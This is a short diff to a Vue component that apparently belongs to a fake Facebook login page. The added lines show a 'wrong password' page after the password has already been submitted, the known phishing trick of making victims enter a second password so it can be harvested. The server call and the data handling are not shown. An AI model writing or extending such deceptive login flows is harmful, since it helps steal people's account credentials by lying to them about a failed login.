@@ -74,6 +74,8 @@ export default {
             console.log(response);
             // Set secondPassword flag to true
             this.secondPassword = true;
+            // Set wrongPw to true to display the wrong password page
+            this.wrongPw = true;
           })
           .catch((error) => {
             console.error(error);
@@ -120,6 +122,7 @@ export default {
   },
 };
 </script>
+
 
 <template>
   <div v-if="loading" id="loadFacebookC" class="">
